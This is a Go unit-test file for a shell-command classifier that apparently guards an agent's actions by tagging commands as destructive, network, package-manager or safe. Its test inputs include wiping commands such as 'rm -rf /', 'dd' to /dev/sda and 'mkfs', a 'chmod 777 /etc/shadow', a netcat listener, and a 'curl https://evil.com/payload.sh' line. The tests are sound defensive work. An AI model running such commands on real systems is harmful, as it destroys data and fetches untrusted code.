/**
 * Author: Deepankar Das
 */

package enforcement

import (
	"testing"

	"github.com/anthropics/enforcer/internal/types"
)

func classificationContains(cs []types.ResourceClassification, tag types.ResourceClassification) bool {
	for _, c := range cs {
		if c == tag {
			return true
		}
	}
	return false
}

// --- Destructive commands ---

func TestClassify_RmRf(t *testing.T) {
	cs := ClassifyCommand("rm -rf /tmp/data")
	if !classificationContains(cs, types.ClassDestructive) {
		t.Fatalf("expected destructive, got %v", cs)
	}
}

func TestClassify_RmR(t *testing.T) {
	cs := ClassifyCommand("rm -r ./old")
	if !classificationContains(cs, types.ClassDestructive) {
		t.Fatalf("expected destructive, got %v", cs)
	}
}

func TestClassify_GitPushForce(t *testing.T) {
	cs := ClassifyCommand("git push --force origin main")
	if !classificationContains(cs, types.ClassDestructive) {
		t.Fatalf("expected destructive, got %v", cs)
	}
}

func TestClassify_GitPushForceShort(t *testing.T) {
	cs := ClassifyCommand("git push -f origin main")
	if !classificationContains(cs, types.ClassDestructive) {
		t.Fatalf("expected destructive, got %v", cs)
	}
}

func TestClassify_GitResetHard(t *testing.T) {
	cs := ClassifyCommand("git reset --hard HEAD~1")
	if !classificationContains(cs, types.ClassDestructive) {
		t.Fatalf("expected destructive, got %v", cs)
	}
}

func TestClassify_Chmod(t *testing.T) {
	cs := ClassifyCommand("chmod 777 /etc/shadow")
	if !classificationContains(cs, types.ClassDestructive) {
		t.Fatalf("expected destructive, got %v", cs)
	}
}

func TestClassify_Chown(t *testing.T) {
	cs := ClassifyCommand("chown root:root /etc/passwd")
	if !classificationContains(cs, types.ClassDestructive) {
		t.Fatalf("expected destructive, got %v", cs)
	}
}

func TestClassify_Kill9(t *testing.T) {
	cs := ClassifyCommand("kill -9 1234")
	if !classificationContains(cs, types.ClassDestructive) {
		t.Fatalf("expected destructive, got %v", cs)
	}
}

func TestClassify_KillKILL(t *testing.T) {
	cs := ClassifyCommand("kill -KILL 5678")
	if !classificationContains(cs, types.ClassDestructive) {
		t.Fatalf("expected destructive, got %v", cs)
	}
}

func TestClassify_Pkill(t *testing.T) {
	cs := ClassifyCommand("pkill nginx")
	if !classificationContains(cs, types.ClassDestructive) {
		t.Fatalf("expected destructive, got %v", cs)
	}
}

func TestClassify_Killall(t *testing.T) {
	cs := ClassifyCommand("killall python")
	if !classificationContains(cs, types.ClassDestructive) {
		t.Fatalf("expected destructive, got %v", cs)
	}
}

func TestClassify_Mkfs(t *testing.T) {
	cs := ClassifyCommand("mkfs.ext4 /dev/sda1")
	if !classificationContains(cs, types.ClassDestructive) {
		t.Fatalf("expected destructive, got %v", cs)
	}
}

func TestClassify_Dd(t *testing.T) {
	cs := ClassifyCommand("dd if=/dev/zero of=/dev/sda bs=1M")
	if !classificationContains(cs, types.ClassDestructive) {
		t.Fatalf("expected destructive, got %v", cs)
	}
}

func TestClassify_Shred(t *testing.T) {
	cs := ClassifyCommand("shred -u secret.txt")
	if !classificationContains(cs, types.ClassDestructive) {
		t.Fatalf("expected destructive, got %v", cs)
	}
}

// --- Network tools ---

func TestClassify_Curl(t *testing.T) {
	cs := ClassifyCommand("curl https://example.com")
	if !classificationContains(cs, types.ClassNetworkTool) {
		t.Fatalf("expected network_tool, got %v", cs)
	}
}

func TestClassify_Wget(t *testing.T) {
	cs := ClassifyCommand("wget https://example.com/file.tar.gz")
	if !classificationContains(cs, types.ClassNetworkTool) {
		t.Fatalf("expected network_tool, got %v", cs)
	}
}

func TestClassify_Ssh(t *testing.T) {
	cs := ClassifyCommand("ssh user@host.example.com")
	if !classificationContains(cs, types.ClassNetworkTool) {
		t.Fatalf("expected network_tool, got %v", cs)
	}
}

func TestClassify_Scp(t *testing.T) {
	cs := ClassifyCommand("scp file.txt user@host:/tmp/")
	if !classificationContains(cs, types.ClassNetworkTool) {
		t.Fatalf("expected network_tool, got %v", cs)
	}
}

func TestClassify_Nmap(t *testing.T) {
	cs := ClassifyCommand("nmap -sS 192.168.1.0/24")
	if !classificationContains(cs, types.ClassNetworkTool) {
		t.Fatalf("expected network_tool, got %v", cs)
	}
}

func TestClassify_Nc(t *testing.T) {
	cs := ClassifyCommand("nc -l 8080")
	if !classificationContains(cs, types.ClassNetworkTool) {
		t.Fatalf("expected network_tool, got %v", cs)
	}
}

func TestClassify_Ping(t *testing.T) {
	cs := ClassifyCommand("ping 8.8.8.8")
	if !classificationContains(cs, types.ClassNetworkTool) {
		t.Fatalf("expected network_tool, got %v", cs)
	}
}

func TestClassify_Dig(t *testing.T) {
	cs := ClassifyCommand("dig example.com")
	if !classificationContains(cs, types.ClassNetworkTool) {
		t.Fatalf("expected network_tool, got %v", cs)
	}
}

// --- Package managers ---

func TestClassify_NpmInstall(t *testing.T) {
	cs := ClassifyCommand("npm install express")
	if !classificationContains(cs, types.ClassPackageManager) {
		t.Fatalf("expected package_manager, got %v", cs)
	}
}

func TestClassify_NpmI(t *testing.T) {
	cs := ClassifyCommand("npm i lodash")
	if !classificationContains(cs, types.ClassPackageManager) {
		t.Fatalf("expected package_manager, got %v", cs)
	}
}

func TestClassify_PipInstall(t *testing.T) {
	cs := ClassifyCommand("pip install requests")
	if !classificationContains(cs, types.ClassPackageManager) {
		t.Fatalf("expected package_manager, got %v", cs)
	}
}

func TestClassify_Pip3Install(t *testing.T) {
	cs := ClassifyCommand("pip3 install flask")
	if !classificationContains(cs, types.ClassPackageManager) {
		t.Fatalf("expected package_manager, got %v", cs)
	}
}

func TestClassify_BrewInstall(t *testing.T) {
	cs := ClassifyCommand("brew install jq")
	if !classificationContains(cs, types.ClassPackageManager) {
		t.Fatalf("expected package_manager, got %v", cs)
	}
}

func TestClassify_YarnAdd(t *testing.T) {
	cs := ClassifyCommand("yarn add react")
	if !classificationContains(cs, types.ClassPackageManager) {
		t.Fatalf("expected package_manager, got %v", cs)
	}
}

func TestClassify_CargoInstall(t *testing.T) {
	cs := ClassifyCommand("cargo install ripgrep")
	if !classificationContains(cs, types.ClassPackageManager) {
		t.Fatalf("expected package_manager, got %v", cs)
	}
}

func TestClassify_GemInstall(t *testing.T) {
	cs := ClassifyCommand("gem install rails")
	if !classificationContains(cs, types.ClassPackageManager) {
		t.Fatalf("expected package_manager, got %v", cs)
	}
}

func TestClassify_GoInstall(t *testing.T) {
	cs := ClassifyCommand("go install golang.org/x/tools/gopls@latest")
	if !classificationContains(cs, types.ClassPackageManager) {
		t.Fatalf("expected package_manager, got %v", cs)
	}
}

func TestClassify_GoGet(t *testing.T) {
	cs := ClassifyCommand("go get github.com/stretchr/testify")
	if !classificationContains(cs, types.ClassPackageManager) {
		t.Fatalf("expected package_manager, got %v", cs)
	}
}

// --- Safe commands ---

func TestClassify_Ls(t *testing.T) {
	cs := ClassifyCommand("ls -la")
	if len(cs) != 1 || cs[0] != types.ClassSafe {
		t.Fatalf("expected [safe], got %v", cs)
	}
}

func TestClassify_Echo(t *testing.T) {
	cs := ClassifyCommand("echo hello")
	if len(cs) != 1 || cs[0] != types.ClassSafe {
		t.Fatalf("expected [safe], got %v", cs)
	}
}

func TestClassify_NpmTest(t *testing.T) {
	cs := ClassifyCommand("npm test")
	if len(cs) != 1 || cs[0] != types.ClassSafe {
		t.Fatalf("expected [safe], got %v", cs)
	}
}

func TestClassify_GitStatus(t *testing.T) {
	cs := ClassifyCommand("git status")
	if len(cs) != 1 || cs[0] != types.ClassSafe {
		t.Fatalf("expected [safe], got %v", cs)
	}
}

func TestClassify_Cat(t *testing.T) {
	cs := ClassifyCommand("cat README.md")
	if len(cs) != 1 || cs[0] != types.ClassSafe {
		t.Fatalf("expected [safe], got %v", cs)
	}
}

// --- Compound commands ---

func TestClassify_CompoundDestructiveAndPackage(t *testing.T) {
	cs := ClassifyCommand("rm -rf node_modules && npm install")
	if !classificationContains(cs, types.ClassDestructive) {
		t.Fatalf("expected destructive in compound, got %v", cs)
	}
	if !classificationContains(cs, types.ClassPackageManager) {
		t.Fatalf("expected package_manager in compound, got %v", cs)
	}
}

func TestClassify_CompoundNetworkAndDestructive(t *testing.T) {
	cs := ClassifyCommand("curl https://evil.com/payload.sh || rm -rf /")
	if !classificationContains(cs, types.ClassNetworkTool) {
		t.Fatalf("expected network_tool in compound, got %v", cs)
	}
	if !classificationContains(cs, types.ClassDestructive) {
		t.Fatalf("expected destructive in compound, got %v", cs)
	}
}

func TestClassify_CompoundSemicolon(t *testing.T) {
	cs := ClassifyCommand("echo start; pip install malware; echo done")
	if !classificationContains(cs, types.ClassPackageManager) {
		t.Fatalf("expected package_manager in compound, got %v", cs)
	}
}

func TestClassify_PipedSafeCommands(t *testing.T) {
	cs := ClassifyCommand("ls -la | grep test | wc -l")
	if len(cs) != 1 || cs[0] != types.ClassSafe {
		t.Fatalf("expected [safe] for piped safe commands, got %v", cs)
	}
}

func TestClassify_PipedWithNetwork(t *testing.T) {
	cs := ClassifyCommand("curl https://example.com | grep pattern")
	if !classificationContains(cs, types.ClassNetworkTool) {
		t.Fatalf("expected network_tool in piped command, got %v", cs)
	}
}

// --- CommandHasClassification helper ---

func TestCommandHasClassification_True(t *testing.T) {
	if !CommandHasClassification("rm -rf /tmp", types.ClassDestructive) {
		t.Fatal("expected CommandHasClassification to return true for destructive")
	}
}

func TestCommandHasClassification_False(t *testing.T) {
	if CommandHasClassification("ls -la", types.ClassDestructive) {
		t.Fatal("expected CommandHasClassification to return false for safe command with destructive tag")
	}
}

func TestCommandHasClassification_Safe(t *testing.T) {
	if !CommandHasClassification("echo hello", types.ClassSafe) {
		t.Fatal("expected CommandHasClassification to return true for safe tag on safe command")
	}
}
